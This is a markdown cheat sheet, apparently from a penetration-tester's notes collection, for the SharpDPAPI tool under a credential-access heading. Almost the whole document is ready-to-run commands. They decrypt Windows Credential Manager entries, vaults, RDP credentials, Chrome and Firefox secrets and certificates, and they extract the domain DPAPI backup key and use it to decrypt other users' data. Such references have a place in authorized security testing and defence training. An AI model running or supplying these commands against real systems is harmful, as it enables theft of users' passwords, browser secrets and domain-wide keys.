---
technique: SharpDPAPI
category: credential-access
targets: DPAPI, Credential Manager, Browser Secrets, Certificates
protocols: Local
remote_capable: false
tags: windows credentials dpapi sharpdpapi certificates browser vaults
---

# SharpDPAPI

SharpDPAPI decrypts DPAPI-protected user and machine secrets such as Credential Manager entries, vaults, certificates, browser secrets, and RDP credentials. Machine-level operations require local administrative rights.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User context | User DPAPI decryption needs the user's context, password, hash, masterkey, or SHA1 |
| Local admin | Machine DPAPI key operations require elevation |
| Domain backup key | Domain backup key extraction requires Domain Admin rights |

## Windows

### Triage DPAPI

#cmd #sharpdpapi #dpapi

Find DPAPI-protected data on the current machine.

```cmd title:"Triage DPAPI data with SharpDPAPI"
SharpDPAPI.exe triage
```
<!-- cheat -->

### Machine credentials

#cmd #sharpdpapi #credentials

Decrypt Credential Manager data with the machine DPAPI key.

```cmd title:"Decrypt machine credentials with SharpDPAPI"
SharpDPAPI.exe credentials /machine
```
<!-- cheat -->

### Machine RDP credentials

#cmd #sharpdpapi #rdp

Decrypt RDCMan and RDP-related data with the machine key.

```cmd title:"Decrypt RDP credentials with SharpDPAPI"
SharpDPAPI.exe rdg /machine
```
<!-- cheat -->

### Chrome secrets

#cmd #sharpdpapi #browser

Decrypt Chrome secrets with the machine key.

```cmd title:"Decrypt Chrome secrets with SharpDPAPI"
SharpDPAPI.exe chrome /machine
```
<!-- cheat -->

### Firefox secrets

#cmd #sharpdpapi #browser

Decrypt Firefox secrets with the machine key.

```cmd title:"Decrypt Firefox secrets with SharpDPAPI"
SharpDPAPI.exe firefox /machine
```
<!-- cheat -->

### Machine certificates

#cmd #sharpdpapi #certificates

Extract DPAPI-protected machine certificates.

```cmd title:"Extract machine certificates with SharpDPAPI"
SharpDPAPI.exe certificates /machine
```
<!-- cheat -->

### Vault credentials

#cmd #sharpdpapi #vaults

Decrypt Windows Vault credentials with the machine key.

```cmd title:"Decrypt vault credentials with SharpDPAPI"
SharpDPAPI.exe vaults /machine
```
<!-- cheat -->

### User password decryption

#cmd #sharpdpapi #dpapi

Decrypt user DPAPI data with a known plaintext password.

```cmd title:"Decrypt DPAPI credentials with user password"
SharpDPAPI.exe credentials /password:$user_password
```
<!-- cheat
var user_password
-->

### User NT hash decryption

#cmd #sharpdpapi #dpapi

Decrypt user DPAPI data with a known NT hash.

```cmd title:"Decrypt DPAPI credentials with NT hash"
SharpDPAPI.exe credentials /ntlm:$nt_hash
```
<!-- cheat
var nt_hash
-->

### Masterkey file decryption

#cmd #sharpdpapi #dpapi

Decrypt credentials using a specific masterkey file.

```cmd title:"Decrypt DPAPI credentials with masterkey file"
SharpDPAPI.exe credentials /mkfile:$masterkey_file
```
<!-- cheat
var masterkey_file
-->

### Extract domain backup key

#cmd #sharpdpapi #backupkey

Extract the domain DPAPI backup key.

```cmd title:"Extract domain DPAPI backup key"
SharpDPAPI.exe backupkey /nowrap
```
<!-- cheat -->

### Save domain backup key

#cmd #sharpdpapi #backupkey

Save the domain DPAPI backup key to disk.

```cmd title:"Save domain DPAPI backup key"
SharpDPAPI.exe backupkey /file:$backup_key_file
```
<!-- cheat
var backup_key_file
-->

### Decrypt with backup key

#cmd #sharpdpapi #backupkey

Decrypt DPAPI credentials using a domain backup key.

```cmd title:"Decrypt DPAPI credentials with domain backup key"
SharpDPAPI.exe credentials /pvk:$backup_key_file
```
<!-- cheat
var backup_key_file
-->

### Target user with backup key

#cmd #sharpdpapi #backupkey

Decrypt a specific user's DPAPI data with the domain backup key.

```cmd title:"Decrypt target user DPAPI data with backup key"
SharpDPAPI.exe credentials /pvk:$backup_key_file /target:$target_profile_path
```
<!-- cheat
var backup_key_file
var target_profile_path
-->

## Linux

No Linux operator command is included here. This note covers local Windows SharpDPAPI usage.
